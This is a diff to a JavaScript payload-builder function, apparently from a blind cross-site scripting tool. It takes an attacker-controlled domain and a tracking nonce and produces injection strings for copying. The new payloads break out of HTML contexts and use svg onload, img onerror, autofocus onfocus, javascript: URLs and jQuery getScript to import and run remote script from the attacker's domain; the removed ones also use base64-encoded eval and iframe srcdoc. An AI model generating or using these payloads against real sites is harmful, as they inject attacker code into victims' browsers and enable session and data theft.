@@ -78,18 +78,16 @@ function showMessage(duration) {
 function payloadBuilder(){
 	xdomain = document.getElementById("domain").value;
 	xnonce = document.getElementById("nonce").value;
-	b64 = `var a=document.createElement("script");a.src="https://${xdomain}?n=${xnonce}";document.body.appendChild(a);`;
+	b64 = `var a=document.createElement("script");a.src="https://${xdomain}?pnr.${xnonce}";document.body.appendChild(a);`;
 	b64 = btoa(b64);
-	h = `<script>var a=parent.document.createElement("script");a.src="https://${xdomain}?n=${xnonce}";parent.document.body.appendChild(a);</script>`;
+	h = `<script>var a=parent.document.createElement("script");a.src="https://${xdomain}?pnr.${xnonce}";parent.document.body.appendChild(a);</script>`;
 	h = entityEncode(h);
-	p1 =`"><script src=https://${xdomain}?n=${xnonce}></script>`;
-	p2 =`javascript:eval('var a=document.createElement(\\\'script\\\');a.src=\\\'https://${xdomain}?n=${xnonce}\\\';document.body.appendChild(a)')`;
-	p3 =`"><input onfocus=eval(atob(this.id)) id=${b64} autofocus>`;
-	p4 =`"><img src=x id=${b64} onerror=eval(atob(this.id))>`;
-	p5 =`"><video><source onerror=eval(atob(this.id)) id=${b64}>`;
-	p6 =`"><iframe srcdoc="${h}">`;
-	p7 =`<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//${xdomain}?n=${xnonce}");a.send();</script>`;
-	p8 =`<script>$.getScript("//${xdomain}?n=${xnonce}")</script>`;
+	p1 =`'"></title></style></textarea></script><script src=https://${xdomain}?p1nr.${xnonce}></script>`;
+	p2 =`"><img/src/onerror=import('//${xdomain}?p2nr.${xnonce}')>`;
+	p3 =`"autofocus onfocus=import('//${xdomain}?p3nr.${xnonce}') //`;
+	p4 =`"><svg/onload=import('//${xdomain}?p4nr.${xnonce}')>`;
+	p5 =`javascript:import('//${xdomain}?p5nr.${xnonce}')`;
+	p6 =`<script>$.getScript("//${xdomain}?p6n.${xnonce}")</script>`;
 	
 	document.getElementById("payload1").value = p1;
 	document.getElementById("payload2").value = p2;
@@ -112,6 +110,7 @@ function copyBuild(){
 	copyInputValue("payload7","copy7");
 	copyInputValue("payload8","copy8");
 }
+
 
 
 
